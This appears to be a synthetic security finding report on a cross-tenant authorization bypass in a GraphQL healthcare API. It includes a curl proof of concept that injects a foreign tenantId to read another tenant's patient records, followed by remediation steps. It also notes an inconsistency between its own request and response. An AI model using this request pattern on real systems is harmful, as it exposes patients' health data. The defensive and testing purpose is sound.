# Security Analysis Report
**System:** PatientCore EHR API
**Domain:** Healthcare / EHR Platform
**Example ID:** GQL-0301
**Artifact analyzed:** context.txt (sole source)

---

## Priority Findings

| # | Severity | Category | Title |
|---|----------|----------|-------|
| 1 | CRITICAL | Injection — Pattern 5.1 | Authorization-bypass injection on `listPatients` — attacker from `tenant-e63d` reads EHR patient PHI belonging to `tenant-67c9` via client-supplied tenantId injection |

---

## Finding 1 — Injection: Authorization-Bypass Injection (Pattern 5.1)

### Summary
The `listPatients` resolver on PatientCore EHR API (`api.patientcore-ehr-api.example.com`) accepts a client-supplied `tenantId` argument without validating it against the JWT's `tenantId` claim. Per §5.0 Pattern 5.1, an attacker injects a foreign `tenantId` into the query to bypass the authorization boundary and access another tenant's PHI records. The Redis cache is keyed by `patientId` only (no tenant dimension), amplifying the risk. This is a HIPAA PHI breach.

**Context.txt inconsistency (documented):** The HAR request uses `listPatients(tenantId: "tenant-67c9")` but the response JSON key is `getPatient` (INCONSISTENT with `listPatients`). The HAR (§6.0) is the primary evidence for the exploit path.

**Note on `x-request-id`:** This appears as a *response* header (`"x-request-id": "req-e63d67c9"`). It is server-assigned and must NOT be sent as a request header.

**Pattern:** 5.1 — Authorization-bypass injection (Injection)
**Affected resolver:** `listPatients`
**Affected endpoint:** `POST https://api.patientcore-ehr-api.example.com/graphql`

### Evidence from HAR (§6.0)

**Request — Attack (attacker JWT: `tenant-e63d`, injecting `tenantId: "tenant-67c9"`)**
```
POST https://api.patientcore-ehr-api.example.com/graphql
authorization: Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c3Jfe3VpZH0iLCJyb2xlIjoie3JvbGV9IiwidGVuYW50X2lkIjoie3RlbmFudH0ifQ.SIG
content-type: application/json
x-tenant-id: tenant-e63d

{"query": "query VulnerableOp { listPatients(tenantId: \"tenant-67c9\") { patientId ownerId data { sensitiveField } } }"}
```

**Response — Cross-Tenant EHR Patient PHI Returned**
```json
{
  "data": {
    "getPatient": {
      "tenantId": "tenant-67c9",
      "ownerId": "other-user-e63d67c9",
      "data": {
        "sensitiveField": "CONFIDENTIAL-e63d67c9",
        "internalNotes": "Internal data exposed"
      }
    }
  }
}
```
*`x-request-id: req-e63d67c9` — server-assigned response header, confirms cross-tenant PHI access.*

### Steps to Reproduce
```bash
curl -s -X POST "https://api.patientcore-ehr-api.example.com/graphql" \
  -H "authorization: Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c3Jfe3VpZH0iLCJyb2xlIjoie3JvbGV9IiwidGVuYW50X2lkIjoie3RlbmFudH0ifQ.SIG" \
  -H "content-type: application/json" \
  -H "x-tenant-id: tenant-e63d" \
  -d '{"query": "query VulnerableOp { listPatients(tenantId: \"tenant-67c9\") { patientId ownerId data { sensitiveField } } }"}'
# Vulnerable: tenantId: tenant-67c9 EHR records returned for tenant-e63d caller (HIPAA breach)
# Secure: {"errors":[{"message":"Forbidden"}]}
```

### Remediation
1. `listPatients` must ignore client-supplied `tenantId`; extract from JWT only.
2. Key Redis cache on `tenantId:patientId` composite, not `patientId` alone.
3. Apply HIPAA-compliant row-level security: `WHERE tenant_id = $jwt_tenant_id`.
4. Mandatory audit logging for all PHI access attempts.
